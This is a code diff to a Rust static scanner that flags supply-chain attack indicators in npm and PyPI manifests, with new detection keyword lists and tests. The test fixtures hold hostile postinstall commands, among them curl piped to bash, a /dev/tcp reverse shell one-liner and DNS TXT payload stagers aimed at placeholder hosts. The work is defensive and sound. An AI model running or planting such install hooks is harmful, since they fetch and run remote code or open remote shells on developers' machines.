@@ -204,13 +204,7 @@ pub fn scan_npm_package_json(contents: &str) -> StaticScanReport {
             detail: "package.json is empty".to_string(),
         });
     }
-    if contains_exfil_hint(contents) {
-        findings.push(StaticFinding {
-            severity: FindingSeverity::High,
-            reason_code: "npm_static_exfil_hint".to_string(),
-            detail: "manifest or scripts contain network/credential access indicators".to_string(),
-        });
-    }
+    findings.extend(static_attack_findings("npm", contents));
     StaticScanReport { findings }
 }
 
@@ -230,13 +224,7 @@ pub fn scan_pyproject_toml(contents: &str) -> StaticScanReport {
             detail: "pyproject.toml declares a PEP 517 build backend".to_string(),
         });
     }
-    if contains_exfil_hint(contents) {
-        findings.push(StaticFinding {
-            severity: FindingSeverity::High,
-            reason_code: "pypi_static_exfil_hint".to_string(),
-            detail: "build metadata contains network/credential access indicators".to_string(),
-        });
-    }
+    findings.extend(static_attack_findings("pypi", contents));
     StaticScanReport { findings }
 }
 
@@ -1782,8 +1770,49 @@ fn toml_line_has_balanced_quotes(line: &str) -> bool {
     !in_string && !escaped
 }
 
-fn contains_exfil_hint(contents: &str) -> bool {
+fn static_attack_findings(ecosystem: &str, contents: &str) -> Vec<StaticFinding> {
     let lowered = contents.to_ascii_lowercase();
+    let mut findings = Vec::new();
+    if contains_exfil_hint(&lowered) {
+        findings.push(StaticFinding {
+            severity: FindingSeverity::High,
+            reason_code: format!("{ecosystem}_static_exfil_hint"),
+            detail: "manifest or scripts contain network/credential access indicators".to_string(),
+        });
+    }
+    if contains_dns_txt_stager(&lowered) {
+        findings.push(StaticFinding {
+            severity: FindingSeverity::High,
+            reason_code: format!("{ecosystem}_static_dns_txt_stager"),
+            detail: "manifest or scripts contain DNS TXT payload-staging indicators".to_string(),
+        });
+    }
+    if contains_remote_shell_stager(&lowered) {
+        findings.push(StaticFinding {
+            severity: FindingSeverity::High,
+            reason_code: format!("{ecosystem}_static_remote_shell_stager"),
+            detail: "manifest or scripts contain fetched-payload shell execution indicators"
+                .to_string(),
+        });
+    }
+    if contains_reverse_shell_hint(&lowered) {
+        findings.push(StaticFinding {
+            severity: FindingSeverity::High,
+            reason_code: format!("{ecosystem}_static_reverse_shell_hint"),
+            detail: "manifest or scripts contain reverse-shell capability indicators".to_string(),
+        });
+    }
+    if contains_decode_execute_hint(&lowered) {
+        findings.push(StaticFinding {
+            severity: FindingSeverity::High,
+            reason_code: format!("{ecosystem}_static_decode_execute_hint"),
+            detail: "manifest or scripts contain decode-then-execute indicators".to_string(),
+        });
+    }
+    findings
+}
+
+fn contains_exfil_hint(lowered: &str) -> bool {
     lowered.contains("process.env")
         || lowered.contains("authorization")
         || lowered.contains("token")
@@ -1792,6 +1821,63 @@ fn contains_exfil_hint(contents: &str) -> bool {
         || lowered.contains("fetch(")
         || lowered.contains("https://")
         || lowered.contains("http://")
+}
+
+fn contains_dns_txt_stager(lowered: &str) -> bool {
+    lowered.contains("resolvetxt")
+        || lowered.contains("resolve_txt")
+        || lowered.contains("querytxt")
+        || lowered.contains("dns.resolver")
+        || lowered.contains("recordtype.txt")
+        || lowered.contains("type=txt")
+        || lowered.contains("q=txt")
+        || lowered.contains(" txt ")
+            && (lowered.contains("dig ")
+                || lowered.contains("nslookup ")
+                || lowered.contains("host -t")
+                || lowered.contains("host -a")
+                || lowered.contains("resolve-dnsname"))
+        || lowered.contains(" txt\"") && (lowered.contains("dig ") || lowered.contains("nslookup "))
+        || lowered.contains(" txt'") && (lowered.contains("dig ") || lowered.contains("nslookup "))
+        || lowered.contains("+short txt")
+}
+
+fn contains_remote_shell_stager(lowered: &str) -> bool {
+    ((lowered.contains("curl ") || lowered.contains("wget "))
+        && (lowered.contains("| sh")
+            || lowered.contains("|sh")
+            || lowered.contains("| bash")
+            || lowered.contains("|bash")
+            || lowered.contains(" sh -c")
+            || lowered.contains(" bash -c")))
+        || (lowered.contains("http://") || lowered.contains("https://"))
+            && (lowered.contains("bash -c")
+                || lowered.contains("sh -c")
+                || lowered.contains("node -e")
+                || lowered.contains("python -c")
+                || lowered.contains("perl -e"))
+        || lowered.contains("invoke-expression")
+        || lowered.contains(" iwr ") && lowered.contains(" iex")
+}
+
+fn contains_reverse_shell_hint(lowered: &str) -> bool {
+    lowered.contains("/dev/tcp/")
+        || lowered.contains("nc -e")
+        || lowered.contains("ncat -e")
+        || lowered.contains("bash -i")
+        || lowered.contains("mkfifo ") && lowered.contains("/bin/sh")
+        || lowered.contains("socat ") && lowered.contains("exec:")
+        || lowered.contains("socket.socket(") && lowered.contains("subprocess")
+}
+
+fn contains_decode_execute_hint(lowered: &str) -> bool {
+    (lowered.contains("base64") || lowered.contains("atob(") || lowered.contains("fromcharcode"))
+        && (lowered.contains("eval(")
+            || lowered.contains("exec(")
+            || lowered.contains("bash")
+            || lowered.contains(" sh ")
+            || lowered.contains("node -e")
+            || lowered.contains("python -c"))
 }
 
 struct StaticScanDigestInput<'a> {
@@ -1914,6 +2000,34 @@ build-backend = "fixture_backend""#,
     }
 
     #[test]
+    fn detects_npm_dns_txt_payload_stager_without_execution() {
+        let report = scan_npm_package_json(
+            r#"{"scripts":{"postinstall":"node -e \"require('dns').resolveTxt('stage.example', function(){})\" "}}"#,
+        );
+        assert!(!report.passed());
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.reason_code == "npm_static_dns_txt_stager"));
+    }
+
+    #[test]
+    fn detects_remote_shell_and_reverse_shell_static_hints() {
+        let report = scan_npm_package_json(
+            r#"{"scripts":{"postinstall":"curl https://stage.invalid/p | bash; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}}"#,
+        );
+        assert!(!report.passed());
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.reason_code == "npm_static_remote_shell_stager"));
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.reason_code == "npm_static_reverse_shell_hint"));
+    }
+
+    #[test]
     fn scans_inert_pypi_fixture_without_execution() {
         let pyproject = include_str!("../../../tests/fixtures/pypi/pep517-backend/pyproject.toml");
         let report = scan_pyproject_toml(pyproject);
@@ -1983,6 +2097,28 @@ build-backend = "fixture_backend""#,
         assert!(!output.sanitized_log_summary.contains("node postinstall.js"));
         assert!(!output.audit_event_id.contains("postinstall"));
         assert!(!output.execution_enabled);
+    }
+
+    #[test]
+    fn static_manifest_job_fails_dns_txt_stager_without_raw_payload() {
+        let output = run_static_manifest_job(StaticManifestJobRequest {
+            job_id: "static-job-dns-txt",
+            profile_id: "npm.registry_tarball.v1",
+            profile_version: 1,
+            artifact_digest:
+                "sha256:1111111111111111111111111111111111111111111111111111111111111111",
+            cache_object_key:
+                "blobs/sha256/1111111111111111111111111111111111111111111111111111111111111111",
+            manifest_kind: StaticManifestKind::NpmPackageJson,
+            manifest_contents: r#"{"scripts":{"postinstall":"dig +short TXT stage.example | sh"}}"#,
+        });
+        assert_eq!(output.state, JobState::Failed);
+        assert!(output
+            .reason_codes
+            .iter()
+            .any(|reason| reason == "npm_static_dns_txt_stager"));
+        assert!(!output.sanitized_log_summary.contains("stage.example"));
+        assert!(!output.audit_event_id.contains("stage"));
     }
 
     #[test]
